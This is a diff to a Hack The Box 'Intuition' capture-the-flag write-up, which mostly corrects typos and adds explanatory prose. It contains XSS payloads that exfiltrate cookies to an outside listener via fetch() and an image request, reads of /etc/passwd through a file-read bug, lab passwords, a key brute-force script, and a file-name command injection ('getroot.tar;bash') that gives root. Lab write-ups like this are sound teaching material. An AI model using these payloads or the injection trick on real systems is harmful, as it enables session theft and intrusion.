@@ -56,7 +56,7 @@ Using the registration credentials, let's sign-in:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-5.png)
 
-Now that we are singed-in, we will first take a look at the coookies.
+Now that we are signed-in, we will first take a look at the cookies.
 
 Go to **Storage** -> **Cookies** and we can access the cookie value:
 
@@ -66,22 +66,20 @@ Let's decode the vaule obtained with base64:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-7.png)
 
-Web app is storing cookie in the format of user_id, username, role, and some kind of hash in the end. 
+Web app is storing cookie in the format of **user_id**, **username**, **role**, and some kind of **hash** in the end. 
 
 We have tried cracking this hash but it wasn't successful. 
 
 Let's try changing the **role** from **user** to **admin** and see what happens.
 
-We will base64 encode the modified following data:
+We will **base64** encode the modified following data:
 
-`{"user_id": 6, "username": "jadu", "role": "admin"}|8e8f57556ef8398f42dcbb05bc78b3f8f184f0ff7b0dde60aace0b97cd7216f2`                                         
-
+`{"user_id": 6, "username": "jadu", "role": "admin"}|8e8f57556ef8398f42dcbb05bc78b3f8f184f0ff7b0dde60aace0b97cd7216f2`                                        
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-8.png)
 
 We expected to bypass the login portal after replacing the cookie value with the base64 hash above. 
 
-Unfortunately, nothing happened. Let's restore cookie value to mitigate issue.
-                                                               
+Unfortunately, nothing happened. Let's restore cookie value to mitigate issue.                                                     
 ## XSS Cookie Stealing 
 ### Adam Cookie
 
@@ -93,7 +91,7 @@ Now let's move on to enumerating **report.comprezzor.htb**.
 
 From some research, we have discovered that this form is vulnerable to XSS Cookie Stealing. 
 
-Let's use the following payload on borth field of the form with out Python server listening:
+Let's use the following payload on both fields of the form with out Python server listening:
 
 ```html
 <img src=x onerror="fetch('http://10.10.14.29:8000/?cookie='+document.cookie)">
@@ -101,12 +99,11 @@ Let's use the following payload on borth field of the form with out Python serve
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-9.png)
 
-After successful execution, we can observer cookie being stolen on our Python server:
+After successful execution, we can observe cookie being stolen on our Python server:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-10.png)
 
 Similarly, we can use the following payload as well to obtain the same result:
-
 
 ```html
 <script>var i=new Image(); i.src="http://10.10.14.29:8000/?cookie="+btoa(document.cookie);</script>
@@ -117,10 +114,6 @@ Similarly, we can use the following payload as well to obtain the same result:
 We get cookie value on our Python listener:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-12.png)
-
-```delete this later
-10.10.11.15 - - [30/May/2024 11:36:51] "GET /?cookie=dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA== HTTP/1.1" 200 -
-```
 
 However, cookie value obtained from the first payload and the second payload looks different. This is because seocond payload output cookie is base64 encoded.
 
@@ -137,13 +130,11 @@ Replacing **user_data** cookie value with the obtained cookie for **adam**, we c
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-15.png)
 
 
-
-
 ### Admin Cookie
 
 Let's see what functionality does dashboard provides.
 
-Clicking on report ID, we are provided with the feature of setting the Report to be **Resolved**, **Set High Priority**, or **Delete Report**:
+Clicking on report ID, we are provided with the features of setting the Report to be **Resolved**, **Set High Priority**, or **Delete Report**:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-17.png)
 
@@ -159,7 +150,7 @@ However, priorty is set as **0**:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-19.png)
 
-Using Burp Suite, let's the value for priorty to be **1**, so that the admin user will take a look at it:
+Using Burp Suite, let's the value for priority to be **1**, so that the admin user will take a look at it:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-18.png)
 
@@ -192,7 +183,7 @@ We can observe that some more features are provided for admin:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-22.png)
 
-Checkin on **Create PDF Report**, we can see that we input URL and the web app will generate a PDF Report out of it:
+Checking on **Create PDF Report**, we can see that we input URL and the web app will generate a PDF Report out of it:
 
 `/create_pdf_report`
 
@@ -212,13 +203,11 @@ We can see that the PDF is created and it shows the directory listing for the Py
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-28.png)
 
-Taking a look at the PDF Creator using **exiftool**, it is identifeid to be **wkhtmltopdf 0.12.6**:
+Taking a look at the PDF Creator using **exiftool**, it is identify to be **wkhtmltopdf 0.12.6**:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-29.png)
 
-There is known SSRF vulnerability regarding wkhtmltopdf 0.12.6, but it turned out to be a dead end. 
-
-
+There is known **SSRF** vulnerability regarding wkhtmltopdf 0.12.6, but it turned out to be a dead end. 
 ### CVE-2023–24329
 
 Instead of checking on the PDF creator, let's see what software is being used when it is sending out the PDF back to us.
@@ -249,7 +238,7 @@ Generated PDF contains `/etc/passwd` file, verifying the vulnerability:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-34.png)
 
-Lets request on cmdline to know the current running process.
+Lets request on **cmdline** to know the current running process.
 
 The `/proc/self/cmdline` file in Linux contains the command line arguments passed to the currently running process. It provides insight into how a process was invoked, including any flags, options, or parameters supplied to it:
 
@@ -330,7 +319,7 @@ Key files is a OpenSSH Private Key:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-41.png)
 
-Let's use **ssh-keygen** to output the public key assoicated with the private key, whih might include any comments that were created when the key pair was generated:
+Let's use **ssh-keygen** to output the public key associated with the private key, which might include any comments that were created when the key pair was generated:
 
 `ssh-keygen -y -f  id_rsa`
 
@@ -338,50 +327,76 @@ Let's use **ssh-keygen** to output the public key assoicated with the private ke
 
 User name **dev_acc** was left as a comment on SSH private key.
 
-Now using the discovered paassphrase and SSH Private Key, we can SSH-in to the system as **dev_acc**:
+Now using the discovered passphrase and SSH Private Key, we can SSH-in to the system as **dev_acc**:
 
 `ssh -i id_rsa dev_acc@comprezzor.htb`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-43.png)
 
-dev_acc
-
-Y27SH19HDIWD
-
 
 ## Privesc: dev_acc to lopez
 ### Linpeas
 
+We will first run linpeas to see if there's anything interesting.
+
+There are several ports open internally. We might port forward on these ports later on.
+
+One interesting open port is **21**, meaning FTP is open internally.
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-44.png)
+
+We can also see what users are on the system:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-45.png)
 
+Several interesting files were found, including **users.db** and **users.sql**:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-46.png)
+
+**sqlite** database folder is also found:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-47.png)
 
 ### Local Enumeration
 
+Now let's go ahead and further enumerate on what linpeas discovered. 
+
+There are two web apps running on this machine: **blueprints** and **selenium**
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-48.png)
+
+Let's first check on **users.db** that linpeas found.
+
+We can dump the database using **sqlite3**
 
 `sqlite3 users.db`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-49.png)
 
-adam gray
+We have hashes for **admin** and **adam**.
+
+Only **adam**'s hash could be cracked and the password is: **adam gray**
 
 ### FTP as adam
 
+Since we know that FTP is open internally, let's login to it as **adam**:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-50.png)
+
+There lies **run-tests.sh**, **runner1**, and **runner1.c** files inside `/backup/runner1`:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-51.png)
 
+Let's download all three to `/tmp` directory:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-52.png)
+
+**run-tests.sh** seems to be requiring a key in order to be ran but the last four digits are missing:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-53.png)
 
 
-runner1.c
+**runner1.c** seems to be making authentication by comparing the key to the stored md5 hash before granting to run the application:
 
 ```c
 // Version : 1
@@ -520,7 +535,13 @@ int main(int argc, char *argv[]) {
 ```
 
 
+### Key Guessing
 
+Let's move on to guessing the last four digits of the key.
+
+Here’s the missing value key: `UHI75GHI****`. The hash associated with it is `0feda17076d793c2ef2870d7427ad4ed`.
+
+We can use the Python code below to try all possible combinations:
 
 ```python
 import time
@@ -557,38 +578,64 @@ else:
     print(f"Time consumed: {elapsed_time} seconds")
 ```
 
+Python script guesses the key within 7 seconds: *UHI75GHINKOP*
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-54.png)
 
+### Suricata
 
-UHI75GHINKOP
+Unfortunately, we do not have the privilege to run **runner1** although we have the correct key:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-55.png)
 
+After spending lot of time on enumeration, we found something interesting on `/opt`:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-56.png)
+
+There is a directory called `runner2` but only `sys_adm` group can access it, The idea is, this is the version 2 of the application we was exploiting before `runner1` so it should be related somehow, after some search again I found logs directory for **suricata**.
+
+There are multiple zip files inside `/var/log/suricata`:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-57.png)
 
+
+**Suricata** sometimes leave credentials behind so let's look for the active usernames with **zgrep**.
+
+Searching for user **lopez**, we can see authentication password for user lopez: **Lopezz1992%123**
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-60.png)
 
-Lopezz1992%123
+Now we can switch in to **lopez**'s shell using `su lopez` and the discovered password:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-59.png)
 
-Y27SH19HDIWD
-
 ## Privesc: lopez to root
+
+`lopez` user is one of the `sys-adm` group so we can access the `runner2` directory now:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-58.png)
 
+It seems that **runner2** application receive json file as the input:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-61.png)
+
+After long enumeration, we discovered way to exploit this. 
+
+We will frist create a json file with the key on it as such:
 
 `echo ' { "auth_code": "UHI75GHINKOP", "run": { "action": "install", "role_file": "getroot.tar;bash" } }' > file.json`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-62.png)
 
+Let's create **archive.tar.gz** file:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-63.png)
 
+Now, let's change the name of the zip file into **getroot.tar;bash**:
+
 `mv archive.tar.gz "getroot.tar;bash"`
+
+When we run **runner2** towards **file.json**, we get a shell as the root:
 
 `sudo /opt/runner2/runner2 file.json`
 
